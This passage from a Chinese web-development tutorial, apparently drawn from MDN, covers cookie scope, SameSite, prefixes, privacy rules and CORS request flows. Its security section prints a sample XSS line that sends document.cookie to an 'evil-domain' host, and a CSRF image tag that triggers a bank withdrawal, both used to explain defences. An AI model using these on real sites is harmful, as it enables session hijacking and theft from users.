#### Cookie 的作用域

`Domain` 和 `Path` 标识定义了Cookie的*作用域：*即允许 Cookie 应该发送给哪些URL。

##### Domain 属性

`Domain` 指定了哪些主机可以接受 Cookie。如果不指定，默认为 [origin](https://developer.mozilla.org/zh-CN/docs/Glossary/源)，**不包含子域名**。如果指定了`Domain`，则一般包含子域名。因此，指定 `Domain` 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。 

例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如`developer.mozilla.org`）。

当前大多数浏览器遵循 [RFC 6265](http://tools.ietf.org/html/rfc6265)，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：`Domain=.mozilla.org`

##### Path 属性

`Path` 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

##### SameSite attribute

`SameSite` Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中  [Site](https://developer.mozilla.org/en-US/docs/Glossary/Site) 由可注册域定义），从而可以阻止跨站请求伪造攻击（[CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF)）。

SameSite cookies 是相对较新的一个字段，[所有主流浏览器都已经得到支持](https://developer.mozilla.org/en-US/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility)。

下面是例子：

```
Set-Cookie: key=value; SameSite=Strict
```

SameSite 可以有下面三种值：

- `**None**`**。**浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。
- **`Strict`。**浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）
- **`Lax`。**与 **`Strict`** 类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接

以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。

大多数主流浏览器正在将 [SameSite 的默认值迁移至 Lax](https://www.chromestatus.com/feature/5088147346030592)。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。

##### Cookie prefixes

cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。

子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅[会话劫持（ session fixation）](https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation)。

但是，作为[深度防御措施](https://en.wikipedia.org/wiki/Defense_in_depth_(computing))，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：

- `__Host-`

  如果 cookie 名称具有此前缀，则仅当它也用 `Secure` 属性标记，是从安全来源发送的，不包括 `Domain` 属性，并将 `Path` 属性设置为 `/` 时，它才在 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 标头中接受。这样，这些 cookie 可以被视为 "domain-locked”。

- `__Secure-`

  如果 cookie 名称具有此前缀，则仅当它也用 `Secure` 属性标记，是从安全来源发送的，它才在 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 标头中接受。该前缀限制要弱于 `__Host-` 前缀。

带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。

在应用程序服务器上，Web 应用程序**必须**检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 标头中发送前缀之前，**不会**从 cookie 中剥离前缀。

有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 [Prefixes section of the Set-Cookie reference article](https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes)。

##### JavaScript 通过 Document.cookie 访问 Cookie

通过 [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) 属性可创建新的 Cookie，也可通过该属性访问非`HttpOnly`标记的Cookie。

```
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。

请留意在[安全](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#Security)章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。

### 3.2 安全

信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。

当机器处于不安全环境时，切记*不能*通过 HTTP Cookie 存储、传输敏感信息。

缓解涉及Cookie的攻击的方法：

- 使用 `HttpOnly` 属性可防止通过 JavaScript 访问 cookie 值。
- 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 `SameSite` 属性设置为`Strict` 或 `Lax`。（请参见上方的 [SameSite Cookie](https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#)。）在[支持 SameSite 的浏览器](https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility)中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。

#### 会话劫持和 XSS

在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 [XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS) 攻击。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

#### 跨站请求伪造（CSRF）

[维基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)已经给了一个比较好的 [CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF) 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止 [XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。

### 3.3 跟踪和隐私

#### 第三方 Cookie

Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为*第一方 cookie（ first-party cookie）*。如果域不同，则它是*第三方 cookie（third-party cookie）*。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，[types of cookies used by Google](https://policies.google.com/technologies/types)。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。

如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子[cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement)。

#### Cookie 相关规定

涉及使用 Cookie 的法律或法规包括：

- 欧盟通用数据隐私法规（GDPR）
- 欧盟的《隐私权指令》
- 加州消费者隐私法

这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过2500万美元的实体其他事情。）

这些法规包括以下要求：

- 向用户表明您的站点使用 cookie。
- 允许用户选择不接收某些或所有 cookie。
- 允许用户在不接收 Cookie 的情况下使用大部分服务。

可能还存在其他法规来管理您当地的Cookie。您有责任了解并遵守这些规定。有些公司提供 "cookie banner" 代码，可帮助您遵守这些法规。

可以通过[维基百科的相关内容](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)获取最新的各国法律和更精确的信息。

##### 禁止追踪 Do-Not-Track

虽然并没有法律或者技术手段强制要求使用 [`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)，但是通过[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT) 可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT) 以获取更多信息。

##### 欧盟 Cookie 指令

关于 Cookie，欧盟已经在[2009/136/EC指令](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136)中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。

该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。

#### 僵尸 Cookie 和删不掉的 Cookie

Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：

- [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
- [在维基百科上查看僵尸Cookie](https://en.wikipedia.org/wiki/Zombie_cookie)

### 3.4 在浏览器中存储信息的其他方式

在浏览器中存储数据的另一种方法是 [Web Storage API](https://wiki.developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API)。[window.sessionStorage](https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage) 和[window.localStorage](https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie大，并且永远不会发送到服务器。

可以使用 [IndexedDB API](https://wiki.developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API) 或基于它构建的库来存储更多结构化的数据。

----

## 4.0 跨站资源共享（CORS）

**跨源资源共享** ([CORS](https://developer.mozilla.org/zh-CN/docs/Glossary/CORS)) （或通俗地译为跨域资源共享）是一种基于[HTTP](https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP) 头的机制，该机制通过允许服务器标示除了它自己以外的其它[origin](https://developer.mozilla.org/zh-CN/docs/Glossary/源)（域，协议和端口），这样浏览器可以访问加载这些资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的"预检"请求。在预检中，浏览器发送的头中标示有HTTP方法和真实请求中会用到的头。

跨源HTTP请求的一个例子：运行在 http://domain-a.com 的JavaScript代码使用[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)来发起一个到 https://domain-b.com/data.json 的请求。

出于安全性，浏览器限制脚本内发起的跨源HTTP请求。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。

![img](https://mdn.mozillademos.org/files/14295/CORS_principle.png)

跨源域资源共享（ [CORS](https://developer.mozilla.org/zh-CN/docs/Glossary/CORS) ）机制允许 Web 应用服务器进行跨源访问控制，从而使跨源数据传输得以安全进行。现代浏览器支持在 API 容器中（例如 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) ）使用 CORS，以降低跨源 HTTP 请求所带来的风险。

### 4.1 谁应该了解？

说实话，每个人。

更具体地来讲，这篇文章适用于网站管理员、后端和前端开发者。现代浏览器处理跨源资源共享的客户端部分，包括HTTP头和相关策略的执行。但是这一新标准意味着服务器需要处理新的请求头和响应头。对于服务端的支持，开发者可以阅读补充材料 [cross-origin sharing from a server perspective (with PHP code snippets)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Server-Side_Access_Control) 。

### 4.2 什么情况下需要CORS?

这份 [cross-origin sharing standard](http://www.w3.org/TR/cors/) 允许在下列场景中使用跨站点 HTTP 请求：

- 前文提到的由 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 发起的跨源 HTTP 请求。
- Web 字体 (CSS 中通过` @font-face `使用跨源字体资源)，[因此，网站就可以发布 TrueType 字体资源，并只允许已授权网站进行跨站调用](https://www.w3.org/TR/css-fonts-3/#font-fetching-requirements)。
- [WebGL 贴图](https://developer.mozilla.org/zh-CN/docs/Web/API/WebGL_API/Tutorial/Using_textures_in_WebGL)
- 使用 `drawImage` 将 Images/video 画面绘制到 canvas

本文概述了跨源资源共享机制及其所涉及的 HTTP 头。

### 功能概述

跨源资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 以外的 HTTP 请求，或者搭配某些 MIME 类型的 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 请求），浏览器必须首先使用 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS) 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 [Cookies ](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)和 HTTP 认证相关数据）。

CORS请求失败会产生错误，但是为了安全，在JavaScript代码层面是无法获知到底具体是哪里出了问题。你只能查看浏览器的控制台以得知具体是哪里出现了错误。

接下来的内容将讨论相关场景，并剖析该机制所涉及的 HTTP 首部字段。

### 4.3 若干访问控制场景

这里，我们使用三个场景来解释跨源资源共享机制的工作原理。这些例子都使用 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 对象。

本文中的 JavaScript 代码片段都可以从 http://arunranga.com/examples/access-control/ 获得。另外，使用支持跨源 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 的浏览器访问该地址，可以看到代码的实际运行结果。

关于服务端对跨源资源共享的支持的讨论，请参见这篇文章： [Server-Side_Access_Control (CORS)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Server-Side_Access_Control)。

#### 4.3.1简单请求

某些请求不会触发 [CORS 预检请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#Preflighted_requests)。本文称这样的请求为“简单请求”，请注意，该术语并不属于 [Fetch](https://fetch.spec.whatwg.org/) （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”：

- 使用下列方法之一：

  - [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)
  - [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)
  - [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)

- 除了被用户代理自动设置的首部字段（例如 

  `Connection`

   

  ，

  `User-Agent`

  ）和在 Fetch 规范中定义为 

  禁用首部名称

   的其他首部，允许人为设置的字段为 Fetch 规范定义的 

  对 CORS 安全的首部字段集合

  。该集合为：

  - [`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)
  - [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)
  - [`Content-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language)
  - [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) （需要注意额外的限制）
  - `DPR`
  - `Downlink`
  - `Save-Data`
  - `Viewport-Width`
  - `Width`

- `Content-Type`

   

  的值仅限于下列三者之一：

  - `text/plain`
  - `multipart/form-data`
  - `application/x-www-form-urlencoded`

- 请求中的任意[`XMLHttpRequestUpload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload) 对象均没有注册任何事件监听器；[`XMLHttpRequestUpload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload) 对象可以使用 [`XMLHttpRequest.upload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload) 属性访问。

- 请求中没有使用 [`ReadableStream`](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream) 对象。

**注意:** 这些跨站点请求与浏览器发出的其他跨站点请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨站点请求的网站无需为这一新的 HTTP 访问控制特性担心。

**注意:** WebKit Nightly 和 Safari Technology Preview 为[`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept), [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language), 和 [`Content-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language) 首部字段的值添加了额外的限制。如果这些首部字段的值是“非标准”的，WebKit/Safari 就不会将这些请求视为“简单请求”。WebKit/Safari 并没有在文档中列出哪些值是“非标准”的，不过我们可以在这里找到相关讨论：[Require preflight for non-standard CORS-safelisted request headers Accept, Accept-Language, and Content-Language](https://bugs.webkit.org/show_bug.cgi?id=165178), [Allow commas in Accept, Accept-Language, and Content-Language request headers for simple CORS](https://bugs.webkit.org/show_bug.cgi?id=165566), and [Switch to a blacklist model for restricted Accept headers in simple CORS requests](https://bugs.webkit.org/show_bug.cgi?id=166363)。其它浏览器并不支持这些额外的限制，因为它们不属于规范的一部分。

比如说，假如站点 http://foo.example 的网页应用想要访问 http://bar.other 的资源。http://foo.example 的网页中可能包含类似于下面的 JavaScript 代码：

```
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/public-data/';

function callOtherDomain() {
  if(invocation) {
    invocation.open('GET', url, true);
    invocation.onreadystatechange = handler;
    invocation.send();
  }
}
```

客户端和服务器之间使用 CORS 首部字段来处理权限：

![img](https://mdn.mozillademos.org/files/17214/simple-req-updated.png)

分别检视请求报文和响应报文：

```
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

[XML Data]
```

第 1~10 行是请求首部。第10行 的请求首部字段 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 表明该请求来源于 `http://foo.example`。

第 13~22 行是来自于 http://bar.other 的服务端响应。响应中携带了响应首部字段 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)（第 16 行）。使用 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 和 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) 就能完成最简单的访问控制。本例中，服务端返回的 `Access-Control-Allow-Origin: *` 表明，该资源可以被**任意**外域访问。如果服务端仅允许来自 http://foo.example 的访问，该首部字段的内容如下：

```
Access-Control-Allow-Origin: http://foo.example
```

现在，除了 http://foo.example，其它外域均不能访问该资源（该策略由请求首部中的 ORIGIN 字段定义，见第10行）。`Access-Control-Allow-Origin` 应当为 * 或者包含由 Origin 首部字段所指明的域名。

#### 4.3.2 预检请求

与前述简单请求不同，“需预检的请求”要求必须首先使用 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)  方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。"预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。

如下是一个需要执行预检请求的 HTTP 请求：

```
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/post-here/';
var body = '<?xml version="1.0"?><person><name>Arun</name></person>';

function callOtherDomain(){
  if(invocation)
    {
      invocation.open('POST', url, true);
      invocation.setRequestHeader('X-PINGOTHER', 'pingpong');
      invocation.setRequestHeader('Content-Type', 'application/xml');
      invocation.onreadystatechange = handler;
      invocation.send(body);
    }
}

......
```

上面的代码使用 POST 请求发送一个 XML 文档，该请求包含了一个自定义的请求首部字段（X-PINGOTHER: pingpong）。另外，该请求的 Content-Type 为 application/xml。因此，该请求需要首先发起“预检请求”。

![img](https://mdn.mozillademos.org/files/16753/preflight_correct.png)

```
OPTIONS /resources/post-here/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Origin: http://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER, Content-Type


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
```

预检请求完成之后，发送实际请求：

```
POST /resources/post-here/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
X-PINGOTHER: pingpong
Content-Type: text/xml; charset=UTF-8
Referer: http://foo.example/examples/preflightInvocation.html
Content-Length: 55
Origin: http://foo.example
Pragma: no-cache
Cache-Control: no-cache

<?xml version="1.0"?><person><name>Arun</name></person>


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:40 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://foo.example
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 235
Keep-Alive: timeout=2, max=99
Connection: Keep-Alive
Content-Type: text/plain

[Some GZIP'd payload]
```

浏览器检测到，从 JavaScript 中发起的请求需要被预检。从上面的报文中，我们看到，第 1~12 行发送了一个使用 `OPTIONS 方法的“`预检请求`”。` OPTIONS 是 HTTP/1.1 协议中定义的方法，用以从服务器获取更多信息。该方法不会对服务器资源产生影响。 预检请求中同时携带了下面两个首部字段：

```
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER, Content-Type
```

首部字段 [`Access-Control-Request-Method`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method) 告知服务器，实际请求将使用 POST 方法。首部字段 [`Access-Control-Request-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers) 告知服务器，实际请求将携带两个自定义请求首部字段：`X-PINGOTHER` 与 `Content-Type`。服务器据此决定，该实际请求是否被允许。

第14~26 行为预检请求的响应，表明服务器将接受后续的实际请求。重点看第 17~20 行：

```
Access-Control-Allow-Origin: http://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
```

首部字段` Access-Control-Allow-Methods `表明服务器允许客户端使用` ``POST,` `GET `和 `OPTIONS` 方法发起请求。该字段与 [HTTP/1.1 Allow: response header](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.7) 类似，但仅限于在需要访问控制的场景中使用。

首部字段 `Access-Control-Allow-Headers `表明服务器允许请求中携带字段 `X-PINGOTHER `与` Content-Type`。与` ``Access-Control-Allow-Methods `一样，`Access-Control-Allow-Headers` 的值为逗号分割的列表。

最后，首部字段 `Access-Control-Max-Age` 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该首部字段的值超过了最大有效时间，将不会生效。

##### 预检请求与重定向

大多数浏览器不支持针对于预检请求的重定向。如果一个预检请求发生了重定向，浏览器将报告错误：

> The request was redirected to 'https://example.com/foo', which is disallowed for cross-origin requests that require preflight

> Request requires preflight, which is disallowed to follow cross-origin redirect

CORS 最初要求该行为，不过[在后续的修订中废弃了这一要求](https://github.com/whatwg/fetch/commit/0d9a4db8bc02251cc9e391543bb3c1322fb882f2)。

在浏览器的实现跟上规范之前，有两种方式规避上述报错行为：

- 在服务端去掉对预检请求的重定向；
- 将实际请求变成一个简单请求。

如果上面两种方式难以做到，我们仍有其他办法：

- 发出一个简单请求（使用  [Response.url](https://developer.mozilla.org/en-US/docs/Web/API/Response/url) 或 [XHR.responseURL](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL)）以判断真正的预检请求会返回什么地址。
- 发出另一个请求（真正的请求），使用在上一步通过[Response.url](https://developer.mozilla.org/en-US/docs/Web/API/Response/url) 或 [XMLHttpRequest.responseURL](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL)获得的URL。

不过，如果请求是由于存在 Authorization 字段而引发了预检请求，则这一方法将无法使用。这种情况只能由服务端进行更改。

#### 4.3.3 附带身份凭证的请求

[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 与 CORS 的一个有趣的特性是，可以基于  [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) 和 HTTP 认证信息发送身份凭证。一般而言，对于跨源 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 请求，浏览器**不会**发送身份凭证信息。如果要发送凭证信息，需要设置 `XMLHttpRequest `的某个特殊标志位。

本例中，http://foo.example 的某脚本向 http://bar.other 发起一个GET 请求，并设置 Cookies：

```
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/credentialed-content/';

function callOtherDomain(){
  if(invocation) {
    invocation.open('GET', url, true);
    invocation.withCredentials = true;
    invocation.onreadystatechange = handler;
    invocation.send();
  }
}
```

第 7 行将 `XMLHttpRequest `的 `withCredentials` 标志设置为 `true`，从而向服务器发送 Cookies。因为这是一个简单 GET 请求，所以浏览器不会对其发起“预检请求”。但是，如果服务器端的响应中未携带 `Access-Control-Allow-Credentials: true` ，浏览器将不会把响应内容返回给请求的发送者。

![img](https://mdn.mozillademos.org/files/17213/cred-req-updated.png)

客户端与服务器端交互示例如下：

```
GET /resources/access-control-with-credentials/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
